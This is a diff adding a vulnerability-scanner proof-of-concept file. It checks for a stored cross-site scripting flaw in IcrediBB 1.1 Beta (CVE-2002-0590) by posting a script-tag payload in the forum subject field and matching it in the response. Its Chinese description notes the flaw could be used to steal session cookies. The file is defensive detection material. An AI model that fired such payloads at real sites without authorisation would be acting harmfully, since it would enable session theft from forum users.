@@ -1,0 +1,32 @@
+[info]
+author = "ave"
+description = "验证 IcrediBB 1.1 Beta 跨站脚本（XSS）漏洞。通过向论坛发帖标题（subject）中注入 JavaScript 脚本，检测应用是否存在跨站脚本过滤缺陷。若漏洞存在，其他用户浏览包含恶意脚本的帖子时，脚本将在其浏览器中执行，可被用于窃取会话 Cookie 或执行未授权操作。"
+id = "POC-AVE-2002-0345"
+name = "IcrediBB 1.1 Beta 跨站脚本漏洞验证"
+severity = "high"
+tags = ["ave-2002-0345"]
+vuln_id = [
+    "CVE-2002-0590",
+    "AVE-2002-0345",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/post.php"
+protocol = "http"
+
+[poc.requests.body]
+content = "subject=<script>alert('Cross Site Scripting possible');</script>&message=test&submit=Post"
+type = "form"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["<script>alert('Cross Site Scripting possible');</script>"]
